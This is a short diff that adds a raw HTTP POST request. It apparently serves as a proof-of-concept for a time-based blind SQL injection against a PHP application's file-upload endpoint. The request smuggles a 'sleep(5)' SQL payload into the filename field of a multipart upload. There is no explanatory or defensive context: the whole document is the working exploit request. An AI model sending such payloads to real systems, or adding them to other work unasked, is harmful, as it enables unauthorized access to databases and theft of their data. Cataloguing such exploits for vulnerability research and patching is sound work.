@@ -1,0 +1,9 @@
+POST /index.php?a=upfile&n=uploaw|api&d=task HTTP/1.1
+Host:
+X-Requested-With:XMLHttpRequest
+Content-Type:multipart/form-data;boundary=----WebKitFormBundaryitXXXXXXXX
+
+------WebKitFormBundaryitXXXXXXXX
+Content-Dispostion:form-data;name="file";filename="a',web=(select if(123=123,sleep(5),0))--,png"
+test
+------WebKitFormBundaryitXXXXXXXX
